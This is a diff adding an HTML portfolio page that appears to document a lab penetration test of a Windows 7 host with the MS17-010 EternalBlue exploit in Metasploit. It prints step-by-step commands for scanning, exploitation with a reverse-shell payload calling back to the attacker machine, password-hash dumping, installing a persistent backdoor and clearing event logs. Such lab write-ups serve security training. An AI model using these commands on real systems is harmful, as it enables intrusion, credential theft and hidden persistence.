@@ -1,0 +1,80 @@
+<!-- Windows 7 Exploitation Detail -->
+<div class="detail-header">
+  <a href="#" class="back-button">← Back to Portfolio</a>
+  <h1>Windows 7 MS17-010 EternalBlue Exploitation</h1>
+  <p><span class="tag">MS17-010</span> <span class="tag">EternalBlue</span> <span class="tag">Metasploit</span> <span class="tag">Privilege Escalation</span></p>
+</div>
+
+<div class="detail-content">
+  <div class="step">
+    <h3>Step 1: Reconnaissance and Service Detection</h3>
+    <p>Initial Nmap scan to identify open ports and services on the Windows 7 target:</p>
+    <div class="command-box">nmap -sV -sC 192.168.1.105</div>
+    <div class="screenshot-placeholder">
+      <p>📸 Screenshot: Nmap scan results showing SMB service on port 445</p>
+    </div>
+  </div>
+  
+  <div class="step">
+    <h3>Step 2: Vulnerability Verification</h3>
+    <p>Using Metasploit to check if the target is vulnerable to MS17-010:</p>
+    <div class="command-box">
+      msfconsole<br>
+      use auxiliary/scanner/smb/smb_ms17_010<br>
+      set RHOSTS 192.168.1.105<br>
+      run
+    </div>
+    <div class="screenshot-placeholder">
+      <p>📸 Screenshot: Metasploit confirming MS17-010 vulnerability</p>
+    </div>
+  </div>
+  
+  <div class="step">
+    <h3>Step 3: Exploitation and SYSTEM Access</h3>
+    <p>Launching the EternalBlue exploit to gain initial access:</p>
+    <div class="command-box">
+      use exploit/windows/smb/ms17_010_eternalblue<br>
+      set RHOST 192.168.1.105<br>
+      set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
+      set LHOST 192.168.1.100<br>
+      exploit
+    </div>
+    <div class="screenshot-placeholder">
+      <p>📸 Screenshot: Successful meterpreter session with SYSTEM privileges</p>
+    </div>
+  </div>
+  
+  <div class="step">
+    <h3>Step 4: Post-Exploitation - Screen Capture</h3>
+    <p>Capturing the victim's desktop to monitor user activity:</p>
+    <div class="command-box">
+      meterpreter > screenshots<br>
+      meterpreter > screenshot
+    </div>
+    <div class="screenshot-placeholder">
+      <p>📸 Screenshot: Captured desktop image from Windows 7 target</p>
+    </div>
+  </div>
+  
+  <div class="step">
+    <h3>Step 5: Additional Post-Exploitation Activities</h3>
+    <p>Gathering system information and establishing persistence:</p>
+    <div class="command-box">
+      meterpreter > sysinfo<br>
+      meterpreter > getuid<br>
+      meterpreter > hashdump<br>
+      meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.100
+    </div>
+    <p>Successfully dumped password hashes and created a persistent backdoor.</p>
+  </div>
+  
+  <div class="step">
+    <h3>Step 6: Cleanup and Reporting</h3>
+    <p>Removing traces and documenting findings:</p>
+    <div class="command-box">
+      meterpreter > clearev<br>
+      meterpreter > exit
+    </div>
+    <p>Created detailed report including timeline, exploited vulnerability, and mitigation recommendations.</p>
+  </div>
+</div>
